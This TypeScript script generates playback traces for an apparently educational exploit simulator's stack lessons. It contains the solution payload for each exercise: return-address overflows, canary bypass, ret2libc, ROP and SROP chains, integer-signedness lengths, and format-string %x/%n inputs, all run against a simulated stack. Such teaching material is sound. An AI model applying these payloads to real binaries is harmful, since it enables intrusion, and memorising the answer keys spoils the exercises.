// Bundled by build.sh against a 0xVRIG checkout. Covers the stack family:
// the imagine-rit lessons, unit1-stack, unit2-logic, and unit3-stack-ii.
// entry.ts only drives input-hex with ASLR off, so this adds text input,
// format strings (FmtEngine), integer overflow, signedness, a fixed ASLR
// slide, and the leaked canary. Each payload is run through VRIG's own engine
// and only recorded solved when VRIG says the exercise is won.
//
//   node dist/vrig-stack.mjs [traces-dir]

import { getExercise } from '@/exercises/registry';
import { BASE_SYMBOLS } from '@/exercises/shared/symbols';
import { StackSim } from '@/engine/simulators/StackSim';
import { generateExecSteps, execCurrentStep } from '@/engine/execution/StepEngine';
import { simulateFmtRead, simulateFmtWrite } from '@/engine/execution/FmtEngine';
import { writeFileSync } from 'fs';
import { join } from 'path';

const OUT_DIR = process.argv[2] || 'traces';
const strip = (s: string) => s.replace(/<[^>]+>/g, '');

// One fixed, page-aligned slide recorded per run so the ASLR lessons play
// back deterministically. These sit inside the ranges computeSymbols() in
// ExercisePageClient draws from (code < 0x200000, libc < 0x10000000).
const SLIDE = { code: 0x1a3000, libc: 0x0a8e0000, stack: 0x71000 };

const CODE_SYMBOLS = ['main', 'win', 'vuln', 'normal'];
const LIBC_SYMBOLS = ['system', 'binsh'];
const STACK_SYMBOLS = ['main_ret'];

function computeSymbols(ex: any): Record<string, number> {
  const s: Record<string, number> = { ...BASE_SYMBOLS };
  if (ex.aslr) {
    for (const k of Object.keys(s)) {
      if (CODE_SYMBOLS.includes(k)) s[k] = (s[k] + SLIDE.code) >>> 0;
      else if (LIBC_SYMBOLS.includes(k)) s[k] = (s[k] + SLIDE.libc) >>> 0;
      else if (STACK_SYMBOLS.includes(k)) s[k] = (s[k] + SLIDE.stack) >>> 0;
      else s[k] = (s[k] + SLIDE.code) >>> 0;
    }
  }
  if (ex.srop) {
    s['sigreturn'] = 0x080481b0;
    if (ex.aslr) s['sigreturn'] = (0x080481b0 + (s['main'] - BASE_SYMBOLS.main)) >>> 0;
  }
  return s;
}

// retAddrInMain() and the extraSize table, both copied from ExercisePageClient
const retAddrInMain = (s: Record<string, number>) => (s.main || BASE_SYMBOLS.main) + 0x25;
function extraSizeFor(ex: any): number {
  if (ex.ret2libc) return 8;
  if (ex.rop) return 40;
  if (ex.srop) return 44;
  if (ex.pivot) return 40;
  return 0;
}

const LE = (v: number) => [(v >>> 0) & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff];
const pad = (n: number, b = 0x41) => Array(n).fill(b);

type Built = { bytes: number[]; text?: string };
type Spec = {
  id: string;
  build: (sim: StackSim, sym: Record<string, number>) => Built;
  extra?: { intOverflowLen?: number; signedLen?: number };
};

function runStep(spec: Spec) {
  const ex = getExercise(spec.id);
  if (!ex) throw new Error('no exercise ' + spec.id);
  const symbols = computeSymbols(ex);
  const sim = new StackSim({
    bufSize: ex.bufSize ?? 16,
    retAddr: retAddrInMain(symbols),
    savedEbp: 0xbfff0200,
    useCanary: ex.canary,
    extraSize: extraSizeFor(ex),
  });

  const built = spec.build(sim, symbols);
  const bytes = built.bytes;

  const snap = () => ({
    memory: Array.from(sim.memory),
    written: Array.from(sim.written),
    overflow: Array.from(sim.overflowAt),
    hl: sim.hlStart >= 0 ? [sim.hlStart, sim.hlEnd] : null,
  });

  const out: any = {
    exercise: ex.id,
    title: ex.title,
    mode: ex.mode,
    source: ex.source.c.map((l: any) => l.text),
    gadgets: ex.gadgets ?? {},
    symbols,
    flagAddr: ex.flagAddr ?? null,
    magicValue: ex.magicValue ?? null,
    aslr: !!ex.aslr,
    aslrSlide: ex.aslr ? SLIDE.code : 0,
    canaryValue: sim.useCanary ? sim.canaryValue : null,
    layout: {
      base: sim.baseAddr, bufSize: sim.bufSize, canarySize: sim.canarySize,
      ebpSize: sim.ebpSize, retSize: sim.retSize, totalSize: sim.totalSize,
    },
    payload: bytes,
    inputText: built.text ?? null,
    winTitle: ex.winTitle,
    winMsg: strip(ex.winMsg),
    initial: snap(),
    steps: [] as any[],
  };

  const state: any = {};
  for (const step of generateExecSteps(ex, bytes, sim, symbols, spec.extra)) {
    const r = execCurrentStep(step, sim, ex, symbols, state);
    out.steps.push({
      label: step.label,
      srcLine: step.srcLine,
      logs: r.logs.map((l) => ({ cls: l.cls, msg: strip(l.msg) })),
      registers: r.registerUpdates ?? {},
      flags: r.flagUpdates ?? {},
      win: !!r.win,
      ...snap(),
    });
    if (r.done) break;
  }
  out.solved = out.steps.some((s: any) => s.win);
  return out;
}

// Pull a clean slot list out of an fmt read/write log run so the numbers on
// screen come from VRIG, not from retyping the FmtEngine stack by hand.
function parseReadSlots(logs: Array<{ cls: string; msg: string }>) {
  const slots: Array<{ slot: number; value: number; label: string }> = [];
  const seen = new Set<number>();
  for (const l of logs) {
    const m = l.msg.match(/read (?:stack )?slot (\d+)(?: \(padded[^)]*\))?: (0x[0-9a-f]+) \((.+)\)\s*$/);
    if (m) {
      const slot = parseInt(m[1], 10);
      if (seen.has(slot)) continue;
      seen.add(slot);
      slots.push({ slot, value: parseInt(m[2], 16) >>> 0, label: m[3] });
      continue;
    }
    // %n names the address slot it writes to; keep it so the scene can draw it
    const w = l.msg.match(/to address at slot (\d+): (0x[0-9a-f]+)/);
    if (w) {
      const slot = parseInt(w[1], 10);
      if (seen.has(slot)) continue;
      seen.add(slot);
      slots.push({ slot, value: parseInt(w[2], 16) >>> 0, label: 'buf[0..3] — your address' });
    }
  }
  return slots.sort((a, b) => a.slot - b.slot);
}

function runFmtRead(id: string, input: string) {
  const ex = getExercise(id)!;
  const symbols = computeSymbols(ex);
  const sim = new StackSim({ bufSize: ex.bufSize ?? 64, retAddr: retAddrInMain(symbols), savedEbp: 0xbfff0200 });

  // walk every slot once to recover the full stack picture for the scene
  const walk = simulateFmtRead(Array(13).join('%x ') , ex, sim, symbols);
  const slots = parseReadSlots(walk.logs.map((l) => ({ cls: l.cls, msg: strip(l.msg) })));

  const res = simulateFmtRead(input, ex, sim, symbols);
  const logs = res.logs.map((l) => ({ cls: l.cls, msg: strip(l.msg) }));
  const secretSlot = (ex.secretOffset ?? 3) + 1;
  return {
    exercise: ex.id, title: ex.title, mode: ex.mode,
    source: ex.source.c.map((l: any) => l.text),
    input, stack: slots,
    secretValue: ex.secretValue ?? null, secretSlot,
    baseAddr: sim.baseAddr,
    logs, solved: !!res.fmtLeakedSecret,
    winTitle: ex.winTitle, winMsg: strip(ex.winMsg),
  };
}

function runFmtWrite(id: string, input: string) {
  const ex = getExercise(id)!;
  const symbols = computeSymbols(ex);
  const sim = new StackSim({ bufSize: ex.bufSize ?? 64, retAddr: retAddrInMain(symbols), savedEbp: 0xbfff0200 });
  const res = simulateFmtWrite(input, ex, sim);
  const logs = res.logs.map((l) => ({ cls: l.cls, msg: strip(l.msg) }));
  const slots = parseReadSlots(logs);
  return {
    exercise: ex.id, title: ex.title, mode: ex.mode,
    source: ex.source.c.map((l: any) => l.text),
    input, stack: slots,
    targetAddr: ex.targetAddr ?? null,
    baseAddr: sim.baseAddr,
    logs, solved: !!res.fmtWriteSuccess,
    winTitle: ex.winTitle, winMsg: strip(ex.winMsg),
  };
}

const specs: Spec[] = [
  // imagine-rit
  { id: 'rit-02', build: () => ({ bytes: [...pad(16), ...pad(4, 0x42), ...pad(4, 0x43)] }) },
  { id: 'rit-03', build: (_s, sym) => ({ bytes: [...pad(16), ...pad(4, 0x42), ...LE(sym.win)] }) },
  { id: 'rit-04', build: (_s, sym) => ({ bytes: [...pad(16), ...pad(4, 0x42), ...LE(sym.win)] }) },
  {
    id: 'rit-rop',
    build: (_s, sym) => ({
      bytes: [...pad(16), ...pad(4, 0x42), ...LE(0x08048300), ...LE(0xdeadbeef), ...LE(0x0804a040), ...LE(sym.win)],
    }),
  },
  // unit1-stack
  { id: 'stack-02', build: () => ({ bytes: [...pad(16), ...pad(4, 0x42), ...pad(4, 0x43)], text: 'A'.repeat(16) + 'BBBB' + 'CCCC' }) },
  { id: 'stack-03', build: (_s, sym) => ({ bytes: [...pad(16), ...pad(4, 0x42), ...LE(sym.win)] }) },
  { id: 'stack-04', build: (_s, sym) => ({ bytes: [...pad(16), ...pad(4, 0x42), ...LE(sym.win)] }) },
  { id: 'stack-05', build: (s, sym) => ({ bytes: [...pad(16), ...LE(s.canaryValue), ...pad(4, 0x42), ...LE(sym.win)] }) },
  // unit2-logic (fmt handled separately)
  { id: 'logic-06', build: (_s, sym) => ({ bytes: [...pad(20), ...LE(sym.win)] }), extra: { intOverflowLen: 0xffffffd0 } },
  { id: 'logic-09', build: (_s, sym) => ({ bytes: [...pad(12), ...LE(sym.win), 0x0c] }) },
  { id: 'logic-10', build: (_s, sym) => ({ bytes: [...pad(68), ...LE(sym.win)] }), extra: { signedLen: -1 } },
  // unit3-stack-ii
  { id: 'stack2-11', build: (_s, sym) => ({ bytes: [...pad(16), ...pad(4, 0x42), ...LE(sym.system), ...pad(4, 0x42), ...LE(sym.binsh)] }) },
  {
    id: 'stack2-13',
    build: (s, sym) => ({
      bytes: [
        ...pad(16), ...pad(4, 0x42),
        ...LE(0x08048300), ...LE(s.baseAddr + 0x20), ...LE(0x0804830c),
        ...LE(0x08048300), ...LE(0xdeadbeef),
        ...LE(0x08048304), ...LE(0x0804a040),
        ...LE(0x08048308), ...LE(sym.win),
      ],
    }),
  },
  {
    id: 'stack2-14',
    build: (_s, sym) => {
      // what the Signal Frame Builder emits: pad + junk ebp + sigreturn +
      // the 15-word x86 sigcontext with eip pointed at win().
      const regs = [0, 0, 0, 0, 0, 0, 0, 0xbfff0400, 0, 0, 0, 0, 0, 0, sym.win]; // esp set, eip at end
      const frame: number[] = [];
      for (const v of regs) frame.push(...LE(v >>> 0));
      return { bytes: [...pad(16), ...pad(4, 0x42), ...LE(sym.sigreturn), ...frame] };
    },
  },
];

const results: Array<{ id: string; solved: boolean }> = [];

for (const spec of specs) {
  const trace = runStep(spec);
  writeFileSync(join(OUT_DIR, spec.id + '.json'), JSON.stringify(trace, null, 1));
  results.push({ id: spec.id, solved: trace.solved });
}

const fmt07 = runFmtRead('logic-07', '%x.%x.%x.%x');
writeFileSync(join(OUT_DIR, 'logic-07.json'), JSON.stringify(fmt07, null, 1));
results.push({ id: 'logic-07', solved: fmt07.solved });

const fmt08 = runFmtWrite('logic-08', '\\x20\\xa0\\x04\\x08%x%x%x%n');
writeFileSync(join(OUT_DIR, 'logic-08.json'), JSON.stringify(fmt08, null, 1));
results.push({ id: 'logic-08', solved: fmt08.solved });

for (const r of results) {
  console.log((r.solved ? 'WON  ' : 'LOST ') + r.id);
}
